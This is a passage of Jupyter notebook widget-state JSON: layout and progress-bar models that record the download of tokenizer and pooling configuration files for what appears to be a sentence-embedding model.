            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "cbc30d3180bf4474983bdb943314d0e3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "fddfcbd623674e058b8db6f0ec5a5072": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7fe61433610d471f8379fb66da715e89",
              "IPY_MODEL_138b7a559e04436fa39f5329583e9f05",
              "IPY_MODEL_008abd25bc0341b596d63679f38808cd"
            ],
            "layout": "IPY_MODEL_d9d78fda73d4487fb57dffa3f4cc79f8"
          }
        },
        "7fe61433610d471f8379fb66da715e89": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f9ee9879835d41cf9941a0deb241e9db",
            "placeholder": "​",
            "style": "IPY_MODEL_3764fa3597c641c09a77fc04d5c9dc70",
            "value": "vocab.txt: 100%"
          }
        },
        "138b7a559e04436fa39f5329583e9f05": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9c1a71ebc3974220a872beb1b1f2129c",
            "max": 231508,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_4be0d6b410504683b7d1cbf6699cf0a5",
            "value": 231508
          }
        },
        "008abd25bc0341b596d63679f38808cd": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_17eb2fda991848aba46d702c045976b1",
            "placeholder": "​",
            "style": "IPY_MODEL_ce644577204b47bda24082cff7998416",
            "value": " 232k/232k [00:00&lt;00:00, 512kB/s]"
          }
        },
        "d9d78fda73d4487fb57dffa3f4cc79f8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f9ee9879835d41cf9941a0deb241e9db": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3764fa3597c641c09a77fc04d5c9dc70": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9c1a71ebc3974220a872beb1b1f2129c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4be0d6b410504683b7d1cbf6699cf0a5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "17eb2fda991848aba46d702c045976b1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ce644577204b47bda24082cff7998416": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e73f5e429c484904b4e219937b60367a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_ace37b4b56cc42b2a39a1934cdfd76e8",
              "IPY_MODEL_372d9985a5434edcb58f449cfa741cad",
              "IPY_MODEL_0487f08a6dd04388878af20a7efac81a"
            ],
            "layout": "IPY_MODEL_d2c2d4e15c174ab2a7591fea6ea07f81"
          }
        },
        "ace37b4b56cc42b2a39a1934cdfd76e8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_1e26f07104804238b4685e0e0f47d4d2",
            "placeholder": "​",
            "style": "IPY_MODEL_2bcc743683e242a9b93e985d50343e78",
            "value": "tokenizer.json: 100%"
          }
        },
        "372d9985a5434edcb58f449cfa741cad": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8fac7a3f36054145b839e38e007a451b",
            "max": 711396,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_e2b01d5362444cb7a0261f1e3ead03c2",
            "value": 711396
          }
        },
        "0487f08a6dd04388878af20a7efac81a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7f6876709e7a4599adb222cad90b90ac",
            "placeholder": "​",
            "style": "IPY_MODEL_7574cd75653c42498d854e6ccc2e07f7",
            "value": " 711k/711k [00:00&lt;00:00, 788kB/s]"
          }
        },
        "d2c2d4e15c174ab2a7591fea6ea07f81": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "1e26f07104804238b4685e0e0f47d4d2": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2bcc743683e242a9b93e985d50343e78": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "8fac7a3f36054145b839e38e007a451b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e2b01d5362444cb7a0261f1e3ead03c2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "7f6876709e7a4599adb222cad90b90ac": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7574cd75653c42498d854e6ccc2e07f7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "3ce9f79813cb4a559bbfc62f06efe28c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_e4f0c55bd0664a08825fb5718e3f1111",
              "IPY_MODEL_6755845f62cf45db89891cd0229faa18",
              "IPY_MODEL_aaf0d7d39018443eb64c95d62acb6cf5"
            ],
            "layout": "IPY_MODEL_057696046b164065bc22bae251ee87c0"
          }
        },
        "e4f0c55bd0664a08825fb5718e3f1111": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a21755d36c424b60bd9375daae38e5aa",
            "placeholder": "​",
            "style": "IPY_MODEL_8fd7dff198df4744a1f53920422a6e6c",
            "value": "special_tokens_map.json: 100%"
          }
        },
        "6755845f62cf45db89891cd0229faa18": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_940b2dfbef444d1998abe70a38baf2ba",
            "max": 125,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_db4931cc3fbe4fcd891ec777aad9ea11",
            "value": 125
          }
        },
        "aaf0d7d39018443eb64c95d62acb6cf5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_38544af91210445684656fbfe5b7bc4b",
            "placeholder": "​",
            "style": "IPY_MODEL_9e9ce3310454458181bced61adee04c0",
            "value": " 125/125 [00:00&lt;00:00, 6.03kB/s]"
          }
        },
        "057696046b164065bc22bae251ee87c0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a21755d36c424b60bd9375daae38e5aa": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "8fd7dff198df4744a1f53920422a6e6c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "940b2dfbef444d1998abe70a38baf2ba": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "db4931cc3fbe4fcd891ec777aad9ea11": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "38544af91210445684656fbfe5b7bc4b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9e9ce3310454458181bced61adee04c0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ae52692eaca042a3900c032f549074b7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_b3161c3a23fb4971a56c1c1bc9564186",
              "IPY_MODEL_51a3aabb657246688ecf1527b53a14b5",
              "IPY_MODEL_cded72585e49455e9194bdbfcb321727"
            ],
            "layout": "IPY_MODEL_6bbb80a179994970b7748738b6e0a55e"
          }
        },
        "b3161c3a23fb4971a56c1c1bc9564186": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_85bcb9796f63411bb57d11f526653802",
            "placeholder": "​",
            "style": "IPY_MODEL_55089a230d254ba2a93eee63c36c768c",
            "value": "1_Pooling/config.json: 100%"
          }
        },
        "51a3aabb657246688ecf1527b53a14b5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_88b6a2a1be174813926d67eb497b0d76",
            "max": 190,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_7a906f87d8164064909a8e405ce38a04",
            "value": 190
          }
        },
        "cded72585e49455e9194bdbfcb321727": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_974a52f0dcfb450c8c3d8346a30b5c60",
            "placeholder": "​",
            "style": "IPY_MODEL_6b07e8f6dcc14d43bf2598b64b1f4367",
